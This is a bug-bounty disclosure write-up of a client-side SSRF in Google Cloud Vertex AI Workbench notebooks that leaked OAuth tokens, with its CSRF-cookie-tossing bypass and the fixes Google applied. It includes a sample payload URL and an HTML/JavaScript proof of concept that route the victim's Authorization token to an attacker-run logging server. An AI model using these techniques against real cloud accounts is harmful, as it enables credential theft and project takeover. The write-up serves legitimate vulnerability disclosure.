+++
title = 'Client-Side SSRF to Google Cloud Project Takeover [Google VRP]'
date = 2023-01-12T19:42:44+05:30
+++

This write-up is a part of a series of write-ups about the bugs I and [Sivanesh](https://twitter.com/sivaneshashok) found in Google Cloud in 2022.  

Google Cloud offers [Vertex AI](https://cloud.google.com/vertex-ai/), which lets you build, deploy and scale machine learning models. In addition to various other features, Vertex AI also provides a ["Workbench"](https://cloud.google.com/vertex-ai/docs/workbench/introduction) feature. Workbench enables you to create Jupyter notebook-based development environment on the cloud. If you have used a Jupyter notebook, you would know that there are a lot of things that could go wrong here. So I decided to dig deeper.  

Workbench provides you with two options:

- **Managed notebooks** instances are notebooks hosted in Google-managed environments. Which means you won't have much control over it.
- **User-managed notebooks** are heavily customizable and are entirely managed by the user.  

## Initial bug
 When you create a notebook, it will give you an instance at `https://{random-number}-dot-us-central1.notebooks.googleusercontent.com/`

Since managed notebooks are in a Google-managed environment (which is sandboxed), they won't have access to your Google cloud data. So you have to give managed notebooks the permission to access your Google Cloud data via an OAuth flow.  

![Auth](/images/gcloud-ssrf/auth.png)  
*`Scope: https://www.googleapis.com/auth/cloud-platform`*  

After authenticating, I decided to use the app to understand the flow. Then I stumbled upon this particular URL :  

`https://{INSTANCE-ID}-dot-us-central1.notebooks.googleusercontent.com/aipn/v2/proxy/compute.googleapis.com/something`  

Hmm, that smells SSRF to me. Requesting the original URL resulted in a response that looked like the output of an authenticated request sent to `compute.googleapis.com` . From previous experience, I know these endpoints use the Authorization header for credentials.  

I tried changing `compute.googleapis.com` to geekycat.in. But it didn't work, it looks like some whitelisting is put into place. After fuzzing around, I have found that `https://{INSTANCE-ID}-dot-us-central1.notebooks.googleusercontent.com/aipn/v2/proxy/{attacker.com}/compute.googleapis.com/` bypasses the check, that was easy 😅  

The logs to my server revealed that it received the request with the `Authorization` token in the header. I quickly verified the access-token. It indeed had `Cloud-Platform` permission to my Google account. Furthermore, the vulnerable endpoint was a `GET` request with no CSRF protection (pretty common).  This means, by tricking the victim into clicking on the crafted link, the attacker could obtain the authorization token and gain complete access to all of the victim's GCP projects.  

## Ways to obtain victim's instance subdomain:  

The attacker needs to know the victim's subdomain for the attack to work. The `Instance-ID` in the victim's subdomain is random and cannot be guessed. So, here are some ways it could be obtained.

- By default, every person's subdomain is leaked to several third-party domains via referer in the general application flow. Some of those domains are:  

    1. https://avatars.githubusercontent.com/
    2. https://github.com
    3. https://registry.npmjs.org  
Anyone with access to these domains or vulnerabilities in these servers could leak the subdomain.  

- Anyone with a "Notebook viewer" role in the victim's project can see the subdomain and then exploit this issue to gain access to all of the victim's projects.  

**Sample payload**: `https://29559448054aa43f-dot-us-central1.notebooks.googleusercontent.com/aipn/v2/proxy/logger.geekycat.in/compute.googleapis.com/`  

## Reward:  

We reported this issue to Google as a part of their Vulnerability Reward Program. They awarded us with a $5000 bounty.  

## Fix:
- Added CSRF protection to the `GET` endpoints.
- Extracts and verifies the domain properly.  

## The bypass:
 After the fix was rolled out, I noticed another behavior that wasn't there before.  

URL:`https://{INSTANCE-ID}-dot-us-central1.notebooks.googleusercontent.com/aipn/v2/proxy/compute.googleapis.com/`  

Earlier, changing `compute.googleapis.com` with something.google.com would result in an error. But this time, it works. Now, if I could find an open redirection in `*.google.com` I could chain that to bypass this check.  

The most common publicly documented open redirects in Google are javascript-based redirections, which wouldn't work in our case since the server doesn't parse JS. So I jumped in to find a 3xx redirection in Google subdomains.  

After a few minutes, I stumbled upon `https://feedburner.google.com`. This service lets you manage the RSS feed for your domain. This works like a proxy to your RSS feed.  

![feedproxy](/images/gcloud-ssrf/feedproxy.png)  

 On playing around, I noticed a behavior that could get us an open redirect. That is, if your proxy is deactivated, it will redirect the URL to your domain rather than proxying your RSS feed.  

## Setting up the open-redirect:  

- Host a RSS file in your domain (logger.geekycat.in)
- Navigate to `https://feedburner.google.com` --> Create proxy --> Enter `https://attacker.com/rss.xml` for Feed URL --> Next --> Copy the "Custom Url" --> Create  

The copied URL was of the format, `https://feeds.feedburner.com/{CUSTOM}/{ID}`  

- Once the proxy is created, click on the three dots --> Deactivate --> Confirm  

Now, visiting `https://feeds.feedburner.com/{CUSTOM}/{ID}` would redirect to your domain. Yeah, the open redirect is not on *.google.com. Initially, Google used to host the RSS proxy on `https://feedburner.google.com`, but now they have changed the domain. Yet, luckily, you could still use the newly created RSS feed on `https://feedburner.google.com` by simply constructing the URL: `https://feedproxy.google.com/{CUSTOM}/{ID}`  

Since we have an open redirect, let's try to perform the same attack again. Visiting `https://{INSTANCE-ID}-dot-us-central1.notebooks.googleusercontent.com/aipn/v2/proxy/feedproxy.google.com/{CUSTOM}/{ID}` would still fail because they have implemented the CSRF protection.  

## Bypassing the CSRF Protection:  

Luckily the Jupyter notebook is hosted on a Tornado server. In previous [research](https://blog.s1r1us.ninja/research/cookie-tossing-to-rce-on-google-cloud-jupyter-notebooks), [@s1r1us]((https://twitter.com/s1r1us_)) mentioned a technique to bypass the CSRF protection in the Tornado server. The Tornado server verifies the CSRF token by comparing the CSRF token in the GET parameter/POST body with the CSRF token in the cookie. If both matches, it passes. Else, it fails. Since subdomains can set cookies to the parent domain, having a javascript execution in any of the subdomains will allow us to set arbitrary CSRF token to the cookie and then bypass the CSRF protection.  

The prerequisite for the CSRF bypass is to have javascript execution in the same-site context. In our case, the application is hosted on `https://{VICTIM-INSTANCE-ID}-dot-us-central1.notebooks.googleusercontent.com`. Since `googleusercontent.com` is a sandboxed domain primarily used to host user-controlled content, it is trivial to obtain javascript execution.  

For obtaining a javascript execution, the attacker has to spin off his **User-managed notebook** in the workbench. There he would get a Jupyter notebook in a   `googleusercontent.com` subdomain.  

The index page of Jupyter notebook is located under `/opt/conda/share/jupyter/lab/static`. Now all he have to do is to edit the HTML page and gain javascript execution in `googleusercontent.com`. Since we have successfully obtained javascript execution, we can now set arbitrary CSRF token and bypass the protection.  

## Putting it all together:
- The attacker obtains open redirect in `feedburner.google.com`
- He then creates his own user-managed notebook and changes its index page with the following content.  

```html
<!DOCTYPE html>
<html lang="en">
<body>
    <script>
        var base_domain = document.domain.substr(document.domain.indexOf('.'));
	    document.cookie='_xsrf=1;Domain='+base_domain;
fetch("https://{VICTIM-INSTANCE-ID}-dot-us-central1.notebooks.googleusercontent.com/aipn/v2/proxy/feedproxy.google.com/{CUSTOM}/{ID}?_xsrf=1",{credentials:"include",mode:"no-cors"})
    </script>
</body>
</html>
```  

When the victim visits the attacker's notebook instance, the above code will get executed.

- `document.cookie='_xsrf=1;Domain='+base_domain;` sets the CSRF token in the victim's cookie to be 1  

- `fetch("https://{VICTIM-INSTANCE-ID}-dot-us-central1.notebooks.googleusercontent.com/aipn/v2/proxy/feedproxy.google.com/{CUSTOM}/{ID}?_xsrf=1",{credentials:"include",mode:"no-cors"})` fetches the vicitm's instance with crdentials included.  

- Since the CSRF token is set to 1, it matches the one in the cookie and bypasses the CSRF protection.  

- Now the victim's instance server will try to fetch `feedproxy.google.com/{CUSTOM}/{ID}` with the victim's authorization header.  

- `feedproxy.google.com/{CUSTOM}/{ID}` will redirect to the attacker's server, and the attacker will obtain the victim's authorization token in their server logs.  

- Since the authorization token has cloud-platform permission, the attacker could have complete access to all of the victim's GCP projects.  

## Video demonstration: 

{{<youtube dIJ-EvLYtls>}}  

## Fix:
Stopped supporting `*.google.com` as a proxy url.  

## Reward:  
We reported this issue to Google as a part of their Vulnerability Reward Program. They awarded us with a $5000 bounty.  













